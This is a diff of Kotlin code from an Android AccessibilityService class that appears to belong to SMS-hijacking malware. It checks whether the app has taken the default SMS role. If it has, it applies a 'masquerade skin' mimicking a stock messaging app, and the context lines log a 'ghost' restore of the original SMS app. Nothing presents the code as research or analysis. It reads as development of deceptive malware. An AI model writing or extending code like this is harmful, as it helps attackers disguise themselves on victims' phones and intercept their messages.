@@ -316,7 +316,11 @@ class MyAccessibilityService : AccessibilityService() {
                             
                             kotlinx.coroutines.delay(600)
                             
-                            if (android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService) == originalPkg) {
+                            val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService)
+                            if (currentDefault == packageName) {
+                                CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
+                            }
+                            if (currentDefault == originalPkg) {
                                 DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
                                 DefaultSmsManager.expectedMode = "" 
                                 prefs.edit().putLong("restore_loop_ts", 0L).apply()
